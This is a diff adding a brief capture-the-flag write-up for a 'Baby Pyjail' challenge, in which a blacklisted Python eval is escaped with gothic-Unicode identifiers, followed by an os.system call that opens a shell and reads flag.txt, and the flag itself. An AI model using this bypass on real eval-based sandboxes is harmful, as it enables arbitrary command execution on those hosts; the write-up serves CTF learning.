@@ -1,4 +1,4 @@
-# Baby Pyjail
+# 『Baby Pyjail』
 > baby pyjail
 
 > Start challenge from: https://ctfify.1pc.tf/challenge/misc_baby_pyjail
@@ -7,7 +7,7 @@
 
 Author: daffainfo
 
-# Code Chall
+# 『Code Chall』
 ```
 inp = input("Input pls")
 
@@ -17,4 +17,18 @@ else:
     print(eval(inp))
 ```
 
-# Solve
+# 『Solve』
+
+We're given this code chall. There are blacklist that we can't use like `_`, `'`, and `.`. Also, We can't use normal character (i mean lowercase ) to do some execute. So how to solve it? well simple.
+
+I use [this](https://github.com/daffainfo/ctf-writeup/tree/main/2023/h4ckc0n%202023/yet%20another%20pyjail) payload to bypass the blacklist. It use `gothic font` to execute the code.
+
+The payload: `𝔢𝔵𝔢𝔠(𝔦𝔫𝔭𝔲𝔱())`. then `__import__("os").system("sh")` and lastly `cat flag.txt`. here's the flag:
+
+<img width="668" height="153" alt="image" src="https://github.com/user-attachments/assets/d797c058-4406-45c0-86c9-16cb772df3b8" />
+
+# 『Explanation』
+
+```
+Flag: RAMADAN{well_ada_banyak_cara_buat_ngesolve_ni_soal}
+```
